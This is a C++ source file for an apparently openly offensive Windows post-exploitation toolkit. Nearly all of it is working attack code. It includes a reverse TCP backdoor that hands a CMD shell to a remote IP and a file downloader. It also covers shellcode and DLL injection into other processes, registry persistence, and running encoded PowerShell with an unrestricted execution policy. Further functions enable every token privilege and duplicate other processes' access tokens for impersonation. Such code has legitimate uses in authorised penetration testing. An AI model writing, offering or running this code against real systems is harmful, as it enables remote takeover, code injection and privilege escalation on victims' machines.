// Copyright (c) 2019 Ivan Šincek

#include <winsock2.h>
#pragma comment(lib, "ws2_32.lib")
#include ".\invoker.h"
#include <iostream>
#include <fstream>
#include <urlmon.h>
#pragma comment(lib, "urlmon.lib")
#include <tlhelp32.h>

void print(std::string msg) {
	msg = msg + "\n";
	printf(msg.c_str());
}

std::string trim(std::string str) {
	char array[] = " \f\n\r\t\v";
	str.erase(0, str.find_first_not_of(array));
	str.erase(str.find_last_not_of(array) + 1);
	return str;
}

std::string input(std::string msg) {
	msg = msg + ": ";
	printf(msg.c_str());
	std::string var = "";
	getline(std::cin, var);
	var = trim(var);
	return var;
}

bool isPositiveNumber(std::string str) {
	return str.find_first_not_of("0123456789") == std::string::npos;
}

void psExec(std::string encoded) {
	std::string command = "PowerShell -ExecutionPolicy Unrestricted -NoProfile -EncodedCommand " + encoded;
	system(command.c_str());
}

bool createFile(std::string file, std::string data) {
	bool error = false;
	std::ofstream stream(file.c_str(), (std::ios::out | std::ios::binary));
	if (stream.fail()) {
		error = true;
		print("Cannot create the file");
	} else {
		stream.write(data.c_str(), data.length());
		print("File was created successfully");
	}
	stream.close();
	return error;
}

std::string readFile(std::string file) {
	std::string data = "";
	std::ifstream stream(file.c_str(), (std::ios:: in | std::ios::binary));
	if (stream.fail()) {
		print("Cannot read the file");
	} else {
		char *buffer = new char[1024];
		while (!stream.eof()) {
			stream.read(buffer, sizeof(buffer));
			data.append(buffer, stream.gcount());
		}
		SecureZeroMemory(&buffer, sizeof(buffer));
		delete[] buffer;
		print("File was read successfully");
	}
	stream.close();
	return data;
}

bool downloadFile(std::string url, std::string out) {
	bool error = false;
	if (URLDownloadToFile(NULL, url.c_str(), out.c_str(), 0, NULL) == S_OK) {
		print("File was downloaded successfully");
	} else {
		error = true;
		print("Cannot download the file");
	}
	return error;
}

bool addRegistryKey(HKEY hKey, std::string path, std::string name, std::string value) {
	bool error = false;
	if (RegCreateKeyExA(hKey, path.c_str(), 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, NULL) != ERROR_SUCCESS) {
		error = true;
		print("Cannot create/open the registry key");
	} else if (RegSetValueExA(hKey, name.c_str(), 0, REG_SZ, (LPBYTE) value.c_str(), strlen(value.c_str())) != ERROR_SUCCESS) {
		error = true;
		print("Cannot set the registry key value");
	} else {
		print("Registry key was added successfully");
	}
	RegCloseKey(hKey);
	return error;
}

bool reverseTCP(std::string ip, int port) {
	bool error = false;
	WSADATA wsaData = {};
	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
		bool error = false;
		print("Cannot initiate the use of Winsock DLL");
	} else {
		SOCKET hSocket = WSASocketA(AF_INET, SOCK_STREAM, 0, NULL, 0, 0);
		if (hSocket == INVALID_SOCKET) {
			bool error = false;
			print("Cannot create the connection socket");
		} else {
			struct sockaddr_in server = {};
			server.sin_family = AF_INET;
			server.sin_addr.s_addr = inet_addr(ip.c_str());
			server.sin_port = htons(port);
			if (WSAConnect(hSocket, (struct sockaddr *) &server, sizeof(server), NULL, NULL, NULL, NULL) != 0) {
				bool error = false;
				print("Cannot connect to the server");
			} else {
				STARTUPINFOA sInfo = {};
				SecureZeroMemory(&sInfo, sizeof(sInfo));
				sInfo.cb = sizeof(sInfo);
				sInfo.dwFlags = STARTF_USESTDHANDLES;
				sInfo.hStdInput = sInfo.hStdOutput = sInfo.hStdError = (HANDLE) hSocket;
				PROCESS_INFORMATION pInfo = {};
				SecureZeroMemory(&pInfo, sizeof(pInfo));
				if (CreateProcessA(NULL, (LPSTR) "CMD", NULL, NULL, TRUE, 0, NULL, NULL, &sInfo, &pInfo) == 0) {
					error = true;
					print("Cannot run the process");
				} else {
					print("Backdoor is up and running...");
					WaitForSingleObject(pInfo.hProcess, INFINITE);
				}
				CloseHandle(pInfo.hProcess);
				CloseHandle(pInfo.hThread);
			}
			SecureZeroMemory(&server, sizeof(server));
		}
		closesocket(hSocket);
	}
	WSACleanup();
	return error;
}

int chooseProcess() {
	bool exists = false;
	PROCESSENTRY32 entry = {};
	entry.dwSize = sizeof(PROCESSENTRY32);
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnapshot == INVALID_HANDLE_VALUE) {
		print("Cannot create the snapshot of current processes");
	} else {
		print("############################# PROCESS LIST #############################");
		printf("# %-6s  |  %-*.*s #\n", "PID", 57, 57, "NAME");
		print("#----------------------------------------------------------------------#");
		while (Process32Next(hSnapshot, &entry)) {
			printf("# %-6d  |  %-*.*s #\n", entry.th32ProcessID, 57, 57, entry.szExeFile);
		}
		print("########################################################################");
		std::string id = input("Enter proccess ID");
		print("");
		if (id.length() < 1) {
			print("Process ID is rquired");
		} else if (!isPositiveNumber(id)) {
			print("Process ID must be a positive number");
		} else {
			int pid = atoi(id.c_str());
			Process32First(hSnapshot, &entry);
			do {
				if (entry.th32ProcessID == pid) {
					exists = true;
					break;
				}
			} while (Process32Next(hSnapshot, &entry));
			if (!exists) {
				print("Process ID does not exists");
			}
		}
	}
	CloseHandle(hSnapshot);
	return exists ? entry.th32ProcessID : -1;
}

bool terminateProcess(int pid) {
	bool error = false;
	HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, 0, pid);
	if (hProcess == NULL) {
		error = true;
		print("Cannot get the process handle");
	} else if (TerminateProcess(hProcess, 0) == 0) {
		error = true;
		print("Cannot terminate the process");
	} else {
		print("Process was terminated successfully");
	}
	CloseHandle(hProcess);
	return error;
}

bool runProcess(std::string file, std::string args, PHANDLE hToken) {
	bool error = false;
	PROCESS_INFORMATION pInfo = {};
	SecureZeroMemory(&pInfo, sizeof(pInfo));
	if (hToken == NULL) {
		STARTUPINFOA sInfo = {};
		SecureZeroMemory(&sInfo, sizeof(sInfo));
		sInfo.cb = sizeof(sInfo);
		if (CreateProcessA(file.c_str(), (LPSTR) args.c_str(), NULL, NULL, 0, CREATE_NEW_CONSOLE, NULL, NULL, &sInfo, &pInfo) == 0) {
			error = true;
		}
	} else {
		STARTUPINFOW sInfo = {};
		SecureZeroMemory(&sInfo, sizeof(sInfo));
		sInfo.cb = sizeof(sInfo);
		std::wstring process = std::wstring(file.begin(), file.end());
		if (CreateProcessWithTokenW(*hToken, LOGON_WITH_PROFILE, (LPCWSTR) process.c_str(), (LPWSTR) args.c_str(), CREATE_NEW_CONSOLE, NULL, NULL, &sInfo, &pInfo) == 0) {
			error = true;
		}
	}
	if (error) {
		print("Cannot run the process");
	} else {
		print("Process was run successfully");
	}
	CloseHandle(pInfo.hProcess);
	CloseHandle(pInfo.hThread);
	return error;
}

std::string getWebContent(std::string url, int port) {
	std::string data = "";
	std::size_t pos = url.find("://");
	if (pos != std::string::npos) {
		url.erase(0, pos + 3);
	}
	std::string host = url;
	std::string path = "/";
	pos = url.find("/");
	if (pos != std::string::npos) {
		host = url.substr(0, pos);
		path = url.substr(pos);
	}
	WSADATA wsaData = {};
	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
		print("Cannot initiate the use of Winsock DLL");
	} else {
		SOCKET hSocket = socket(AF_INET, SOCK_STREAM, 0);
		if (hSocket == INVALID_SOCKET) {
			print("Cannot create the connection socket");
		} else {
			struct hostent *h = gethostbyname(host.c_str());
			if (h == NULL) {
				print("Cannot resolve the server IP address");
			} else {
				struct sockaddr_in server = {};
				server.sin_family = AF_INET;
				server.sin_addr = *((struct in_addr *) h->h_addr);
				server.sin_port = htons(port);
				if (connect(hSocket, (struct sockaddr *) &server, sizeof(server)) != 0) {
					print("Cannot connect to the server");
				} else {
					// change the HTTP request headers here (make sure you always have two empty lines at the end)
					std::string agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0";
					std::string request = "GET " + path + " HTTP/1.1\r\nHost: " + host + "\r\nUser-Agent: " + agent + "\r\nConnection: close\r\n\r\n";
					send(hSocket, request.c_str(), strlen(request.c_str()), 0);
					char *buffer = new char[1024];
					int bytes = 0;
					do {
						bytes = recv(hSocket, buffer, sizeof(buffer), 0);
						data.append(buffer, bytes);
					} while (bytes != 0);
					SecureZeroMemory(&buffer, sizeof(buffer));
					delete[] buffer;
				}
				SecureZeroMemory(&server, sizeof(server));
			}
		}
		closesocket(hSocket);
	}
	WSACleanup();
	return data;
}

std::string extractPayload(std::string data, std::string element, std::string placeholder) {
	std::string payload = "";
	std::size_t pos = element.find(placeholder);
	if (pos == std::string::npos) {
		print("Payload placeholder was not found");
	} else {
		std::string front = element.substr(0, pos);
		std::size_t posFront = data.find(front);
		if (posFront != std::string::npos) {
			data.erase(0, posFront + front.length());
		}
		std::string back = element.substr(pos + placeholder.length());
		std::size_t posBack = data.find(back);
		if (posBack != std::string::npos) {
			data.erase(posBack);
		}
		if (front.length() < 1 || back.length() < 1) {
			print("Payload must be enclosed from both front and back");
		} else if (data.length() < 1) {
			print("Payload was not found or is empty");
		} else {
			payload = data;
			print("Payload was extracted successfully");
		}
	}
	return payload;
}

bool injectBytecode(int pid, std::string bytecode) {
	bool error = false;
	HANDLE hProcess = OpenProcess((PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD), 0, pid);
	if (hProcess == NULL) {
		error = true;
		print("Cannot get the process handle");
	} else {
		PVOID addr = VirtualAllocEx(hProcess, NULL, strlen(bytecode.c_str()), (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
		if (addr == NULL) {
			error = true;
			print("Cannot allocate the additional process memory");
		} else if (WriteProcessMemory(hProcess, addr, bytecode.c_str(), strlen(bytecode.c_str()), NULL) == 0) {
			error = true;
			print("Cannot write to the process memory");
		} else {
			HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE) addr, NULL, 0, NULL);
			if (hThread == NULL) {
				error = true;
				print("Cannot start the process thread");
			} else {
				print("Bytecode was injected successfully");
			}
			CloseHandle(hThread);
		}
		VirtualFreeEx(hProcess, addr, strlen(bytecode.c_str()), MEM_RELEASE);
	}
	CloseHandle(hProcess);
	return error;
}

bool injectDll(int pid, std::string file) {
	bool error = false;
	HANDLE hProcess = OpenProcess((PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD), 0, pid);
	if (hProcess == NULL) {
		error = true;
		print("Cannot get the process handle");
	} else {
		PVOID addr = VirtualAllocEx(hProcess, NULL, strlen(file.c_str()), (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
		if (addr == NULL) {
			error = true;
			print("Cannot allocate the additional process memory");
		} else if (WriteProcessMemory(hProcess, addr, file.c_str(), strlen(file.c_str()), NULL) == 0) {
			error = true;
			print("Cannot write to the process memory");
		} else {
			HMODULE hLib = LoadLibraryA("kernel32.dll");
			LPTHREAD_START_ROUTINE lpRoutine = (LPTHREAD_START_ROUTINE) GetProcAddress(hLib, "LoadLibraryA");
			HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, lpRoutine, addr, 0, NULL);
			if (hThread == NULL) {
				error = true;
				print("Cannot start the process thread");
			} else {
				print("DLL was injected successfully");
			}
			CloseHandle(hThread);
			FreeLibrary(hLib);
		}
		VirtualFreeEx(hProcess, addr, strlen(file.c_str()), MEM_RELEASE);
	}
	CloseHandle(hProcess);
	return error;
}

void enableAccessTokenPrivs() {
	HANDLE hProcess = GetCurrentProcess();
	if (hProcess == NULL) {
		print("Cannot get the process handle");
	} else {
		HANDLE hToken = NULL;
		if (OpenProcessToken(hProcess, (TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES), &hToken) == 0) {
			print("Cannot get the token handle");
		} else {
			struct privs {
				std::string privilege;
				bool set;
			};
			privs array[] = {
				{ "SeAssignPrimaryTokenPrivilege",             false },
				{ "SeAuditPrivilege",                          false },
				{ "SeBackupPrivilege",                         false },
				{ "SeChangeNotifyPrivilege",                   false },
				{ "SeCreateGlobalPrivilege",                   false },
				{ "SeCreatePagefilePrivilege",                 false },
				{ "SeCreatePermanentPrivilege",                false },
				{ "SeCreateSymbolicLinkPrivilege",             false },
				{ "SeCreateTokenPrivilege",                    false },
				{ "SeDebugPrivilege",                          false },
				{ "SeDelegateSessionUserImpersonatePrivilege", false },
				{ "SeEnableDelegationPrivilege",               false },
				{ "SeImpersonatePrivilege",                    false },
				{ "SeIncreaseBasePriorityPrivilege",           false },
				{ "SeIncreaseQuotaPrivilege",                  false },
				{ "SeIncreaseWorkingSetPrivilege",             false },
				{ "SeLoadDriverPrivilege",                     false },
				{ "SeLockMemoryPrivilege",                     false },
				{ "SeMachineAccountPrivilege",                 false },
				{ "SeManageVolumePrivilege",                   false },
				{ "SeProfileSingleProcessPrivilege",           false },
				{ "SeRelabelPrivilege",                        false },
				{ "SeRemoteShutdownPrivilege",                 false },
				{ "SeRestorePrivilege",                        false },
				{ "SeSecurityPrivilege",                       false },
				{ "SeShutdownPrivilege",                       false },
				{ "SeSyncAgentPrivilege",                      false },
				{ "SeSystemEnvironmentPrivilege",              false },
				{ "SeSystemProfilePrivilege",                  false },
				{ "SeSystemtimePrivilege",                     false },
				{ "SeTakeOwnershipPrivilege",                  false },
				{ "SeTcbPrivilege",                            false },
				{ "SeTimeZonePrivilege",                       false },
				{ "SeTrustedCredManAccessPrivilege",           false },
				{ "SeUndockPrivilege",                         false },
				{ "SeUnsolicitedInputPrivilege",               false }
			};
			int size = sizeof(array) / sizeof(array[0]);
			for (int i = 0; i < size - 1; i++) {
				TOKEN_PRIVILEGES tp = {};
				if (LookupPrivilegeValueA(NULL, array[i].privilege.c_str(), &tp.Privileges[0].Luid) != 0 && GetLastError() == ERROR_SUCCESS) {
					tp.PrivilegeCount = 1;
					tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
					if (AdjustTokenPrivileges(hToken, 0, &tp, sizeof(tp), NULL, NULL) != 0 && GetLastError() == ERROR_SUCCESS) {
						array[i].set = true;
					}
				}
			}
			print("########################## PRIVILEGES GRANTED ##########################");
			for (int i = 0; i < size - 1; i++) {
				if (array[i].set) {
					printf("# %-*.*s #\n", 68, 68, array[i].privilege.c_str());
				}
			}
			print("########################################################################");
			print("");
			print("######################## PRIVILEGES NOT GRANTED ########################");
			for (int i = 0; i < size - 1; i++) {
				if (!array[i].set) {
					printf("# %-*.*s #\n", 68, 68, array[i].privilege.c_str());
				}
			}
			print("########################################################################");
		}
		CloseHandle(hToken);
	}
	CloseHandle(hProcess);
}

HANDLE duplicateAccessToken(int pid) {
	HANDLE dToken = NULL;
	HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, 0, pid);
	if (hProcess == NULL) {
		hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, 0, pid);
	}
	if (hProcess == NULL) {
		print("Cannot get the process handle");
	} else {
		HANDLE hToken = NULL;
		if (OpenProcessToken(hProcess, (TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY), &hToken) == 0) {
			print("Cannot get the token handle");
		} else if (DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &dToken) == 0) {
			print("Cannot duplicate the token");
		} else {
			print("Token was duplicated successfully");
		}
		CloseHandle(hToken);
	}
	CloseHandle(hProcess);
	return dToken;
}

